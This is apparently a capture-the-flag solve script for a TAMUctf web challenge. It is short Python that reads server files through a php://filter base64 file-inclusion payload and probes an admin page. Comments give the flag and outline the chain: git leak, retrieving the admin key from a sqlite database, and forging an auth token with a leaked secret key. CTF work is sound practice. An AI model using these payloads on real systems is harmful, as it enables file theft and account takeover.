import requests
url = "http://blackbox.tamuctf.com/"

def leak(file):
    params = {
        "page": f"php://filter/convert.base64-encode/resource={file}"
    }    
    req = requests.post(url=url, params=params)
    print(req.status_code)
    print(req.text)

def send():
    params = {
        "page": f"admin"
    }    
    cookies = {"auth_token": "abc"}
    req = requests.post(url=url, params=params)
    print(req.status_code)
    print(req.text)

send()

# Flag: tamuctf{my_f4v0rit4_7yp3_0f_w3b_ch4113ng3}
# Git leak -> Found that token verification only checks user key -> browse sqlite database to retrieve admin key -> create a auth token with the SECRET_KEY found in config.php -> logged in

# Also able to retrieve file in base64 format using 'php://', not sure how this work, need to analyze this later.